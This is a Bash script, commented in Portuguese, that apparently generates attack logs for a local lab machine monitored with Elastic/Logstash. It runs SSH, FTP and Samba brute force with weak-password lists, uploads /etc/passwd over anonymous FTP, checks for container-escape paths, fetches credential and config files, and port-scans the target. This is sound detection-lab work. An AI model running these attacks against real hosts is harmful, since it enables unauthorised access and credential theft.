#!/bin/bash

# =============================================================================
# Script de Teste de Ataque - MAQ-3
# Gera logs para captura pelo Elastic/Logstash
# =============================================================================

set -e

# Configurações
TARGET_HOST="localhost"
SSH_PORT="2222"
FTP_PORT="2121"
SMB_PORT="2445"

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_header() {
    echo -e "${BLUE}================================${NC}"
    echo -e "${BLUE}  TESTE DE ATAQUE - MAQ-3${NC}"
    echo -e "${BLUE}================================${NC}"
}

print_status() { echo -e "${GREEN}[INFO]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[WARN]${NC} $1"; }
print_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# Função para testar SSH
test_ssh_attack() {
    print_status "Testando ataques SSH..."
    
    # Teste de brute force
    for user in root ftpuser smbuser admin user1; do
        for pass in password123 admin123 toor secret admin password; do
            print_warning "Tentando SSH: $user:$pass"
            timeout 5 sshpass -p "$pass" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -p $SSH_PORT "$user@$TARGET_HOST" "echo 'Login bem-sucedido'" 2>/dev/null && {
                print_status "✅ SSH comprometido: $user:$pass"
                break 2
            } || true
        done
    done
    
    # Teste de chave fraca
    print_warning "Testando chaves SSH fracas..."
    ssh-keyscan -p $SSH_PORT $TARGET_HOST 2>/dev/null | grep -E "(1024|512)" && {
        print_status "✅ Chave SSH fraca detectada"
    }
}

# Função para testar FTP
test_ftp_attack() {
    print_status "Testando ataques FTP..."
    
    # Teste de acesso anônimo
    print_warning "Testando acesso FTP anônimo..."
    echo "ls" | timeout 10 ftp -n $TARGET_HOST $FTP_PORT 2>/dev/null && {
        print_status "✅ FTP anônimo acessível"
        
        # Tentar upload
        print_warning "Tentando upload via FTP anônimo..."
        echo -e "anonymous\nanonymous@test.com\nput /etc/passwd\nquit" | timeout 10 ftp -n $TARGET_HOST $FTP_PORT 2>/dev/null && {
            print_status "✅ Upload via FTP anônimo bem-sucedido"
        }
    }
    
    # Teste de brute force
    for user in ftpuser admin root; do
        for pass in password123 admin123 toor; do
            print_warning "Tentando FTP: $user:$pass"
            echo -e "$user\n$pass\nls\nquit" | timeout 10 ftp -n $TARGET_HOST $FTP_PORT 2>/dev/null && {
                print_status "✅ FTP comprometido: $user:$pass"
                break 2
            } || true
        done
    done
}

# Função para testar Samba
test_samba_attack() {
    print_status "Testando ataques Samba..."
    
    # Teste de acesso público
    print_warning "Testando acesso Samba público..."
    smbclient -L //$TARGET_HOST -U guest -p $SMB_PORT 2>/dev/null && {
        print_status "✅ Samba público acessível"
        
        # Tentar acessar compartilhamento
        print_warning "Tentando acessar compartilhamento público..."
        echo "ls" | smbclient //$TARGET_HOST/Public -U guest -p $SMB_PORT 2>/dev/null && {
            print_status "✅ Compartilhamento público acessível"
        }
    }
    
    # Teste de brute force
    for user in smbuser admin root; do
        for pass in password123 admin123 toor; do
            print_warning "Tentando Samba: $user:$pass"
            smbclient -L //$TARGET_HOST -U "$user%$pass" -p $SMB_PORT 2>/dev/null && {
                print_status "✅ Samba comprometido: $user:$pass"
                break 2
            } || true
        done
    done
}

# Função para testar escape de container
test_container_escape() {
    print_status "Testando escape de container..."
    
    # Verificar se Docker está acessível
    print_warning "Verificando acesso ao Docker socket..."
    if docker ps 2>/dev/null; then
        print_status "✅ Docker socket acessível"
        
        # Tentar listar containers
        print_warning "Listando containers..."
        docker ps -a 2>/dev/null && {
            print_status "✅ Escape de container possível via Docker"
        }
    fi
    
    # Verificar montagens sensíveis
    print_warning "Verificando montagens sensíveis..."
    if mount | grep -E "(proc|sys|docker)"; then
        print_status "✅ Montagens sensíveis detectadas"
    fi
    
    # Verificar capabilities
    print_warning "Verificando capabilities..."
    if capsh --print | grep -E "(SYS_ADMIN|NET_ADMIN|SYS_PTRACE)"; then
        print_status "✅ Capabilities perigosas detectadas"
    fi
}

# Função para testar acesso a arquivos sensíveis
test_sensitive_files() {
    print_status "Testando acesso a arquivos sensíveis..."
    
    # Testar acesso via FTP
    print_warning "Tentando baixar arquivos sensíveis via FTP..."
    if curl -s "ftp://$TARGET_HOST:$FTP_PORT/credentials.txt" 2>/dev/null; then
        print_status "✅ Arquivo de credenciais acessível via FTP"
    fi
    
    # Testar acesso via Samba
    print_warning "Tentando acessar arquivos sensíveis via Samba..."
    if smbclient //$TARGET_HOST/Public -U guest -p $SMB_PORT -c "get config.conf" 2>/dev/null; then
        print_status "✅ Arquivo de configuração acessível via Samba"
    fi
}

# Função para gerar tráfego de rede
generate_network_traffic() {
    print_status "Gerando tráfego de rede para captura..."
    
    # Ping flood
    print_warning "Executando ping flood..."
    ping -c 100 -i 0.1 $TARGET_HOST > /dev/null 2>&1 &
    
    # Port scanning
    print_warning "Executando port scan..."
    for port in 21 22 23 25 53 80 110 143 443 993 995 139 445 1433 1521 3306 3389 5432 5900 6379 8080 8443; do
        timeout 1 nc -z $TARGET_HOST $port 2>/dev/null && {
            print_status "Porta $port aberta"
        } || true
    done
    
    # HTTP requests (se houver web server)
    print_warning "Testando HTTP requests..."
    for i in {1..50}; do
        curl -s "http://$TARGET_HOST:$i" > /dev/null 2>&1 || true
        sleep 0.1
    done
}

# Função para mostrar resumo
show_summary() {
    print_status "Resumo do teste de ataque:"
    echo ""
    echo -e "${YELLOW}🎯 VULNERABILIDADES TESTADAS:${NC}"
    echo "• SSH brute force e chaves fracas"
    echo "• FTP anônimo e upload"
    echo "• Samba público e brute force"
    echo "• Escape de container via Docker"
    echo "• Acesso a arquivos sensíveis"
    echo "• Geração de tráfego de rede"
    echo ""
    echo -e "${YELLOW}📊 LOGS GERADOS:${NC}"
    echo "• Tentativas de login SSH"
    echo "• Acessos FTP anônimos"
    echo "• Conexões Samba"
    echo "• Comandos executados"
    echo "• Tráfego de rede"
    echo ""
    echo -e "${YELLOW}🔍 PRÓXIMOS PASSOS:${NC}"
    echo "• Verificar logs em ./logs/"
    echo "• Configurar Elastic/Logstash para captura"
    echo "• Analisar padrões de ataque"
    echo "• Configurar alertas"
}

# Função principal
main() {
    print_header
    
    # Verificar se o alvo está acessível
    print_status "Verificando conectividade com $TARGET_HOST..."
    if ! ping -c 1 $TARGET_HOST > /dev/null 2>&1; then
        print_error "Host $TARGET_HOST não está acessível"
        exit 1
    fi
    
    # Executar testes
    test_ssh_attack
    test_ftp_attack
    test_samba_attack
    test_container_escape
    test_sensitive_files
    generate_network_traffic
    
    # Aguardar um pouco para finalizar processos
    sleep 5
    
    # Mostrar resumo
    show_summary
    
    print_status "Teste de ataque concluído!"
}

# Executar função principal
main "$@" 